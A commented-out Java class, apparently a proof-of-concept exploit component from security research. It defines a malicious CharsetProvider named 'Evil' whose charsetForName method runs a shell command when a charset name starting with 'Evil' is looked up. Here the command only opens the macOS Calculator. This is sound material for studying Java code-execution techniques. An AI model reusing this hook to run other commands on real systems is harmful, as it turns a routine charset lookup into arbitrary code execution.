//import java.io.IOException;
//import java.nio.charset.Charset;
//import java.util.HashSet;
//import java.util.Iterator;
//
///**
// * @author threedr3am
// */
//public class Evil extends java.nio.charset.spi.CharsetProvider {
//
//    @Override
//    public Iterator<Charset> charsets() {
//        return new HashSet<Charset>().iterator();
//    }
//
//    @Override
//    public Charset charsetForName(String charsetName) {
//        if (charsetName.startsWith("Evil")) {
//            try {
//                Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
//        }
//        return Charset.forName("UTF-8");
//    }
//}
